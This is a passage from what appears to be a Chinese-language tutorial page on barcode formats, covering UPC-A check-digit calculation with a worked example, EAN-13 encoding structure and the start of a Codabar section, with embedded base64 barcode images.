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" alt="UPC-A">
<figcaption aria-hidden="true">UPC-A</figcaption>
</figure>
<p>只能存储数字 (0-9)；有 A、B、C、D、E 五个版本，版本 A-12 位数字，版本
E-7 位数字；最后一位为校验位。</p>
<p>校验码计算顺序：</p>
<ol type="1">
<li>将所有<strong>奇数位置</strong> (第 1、3、5、7、9 和 11 位)
上的数字相加。</li>
<li>然后，将<strong>步骤 1 所得的值</strong>乘以 3。</li>
<li>将所有<strong>偶数位置</strong> (第 2、4、6、8 和 10 位)
上的数字相加。</li>
<li>然后，将该和与<strong>步骤 2 所得的值</strong>相加。</li>
<li>确定一个值与<strong>步骤 4
所得的值</strong>相加时，结果为10的倍数，该值即为校验位的值。</li>
</ol>
<blockquote>
<p>校验码计算示范：</p>
<ol type="1">
<li>1 + 3 + 5 + 7 + 9 + 1 = 26</li>
<li>26 * 3 = 78</li>
<li>2 + 4 + 6 + 8 + 0 = 20</li>
<li>78 + 20 = 108</li>
<li>108 + <strong>2</strong> = 110 (110 % 10 == 0)</li>
</ol>
<p>故校验码为 2</p>
</blockquote>
<h2 id="ean-条形码">EAN 条形码</h2>
<figure>
<img src="data:image/png;base64,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" alt="EAN-13">
<figcaption aria-hidden="true">EAN-13</figcaption>
</figure>
<p>只能存储数字 (0-9)；可以双向扫描
(可以由左至右或由右至左扫描)；存在一位检查码在最右边；存在左、中、右线以区分左、右码；分为
EAN-13 码与 EAN-8 码。</p>
<p>起始符和终止符3个模块的编码均为101，中间分隔符5个模块的编码是01010。左侧数据符和右侧数据符的编码方式不同。在左侧数据符中，有A和B两种编码方式，右侧数据符中有C编码方式。其中A和C之间是反码关系，B和C之间是倒序关系。在左侧数据符中的编码方式选A还是B，由前置码字符决定。</p>
<h2 id="codabar-库德巴条形码">Codabar 库德巴条形码</h2>
<figure>
<img src="data:image/png;base64,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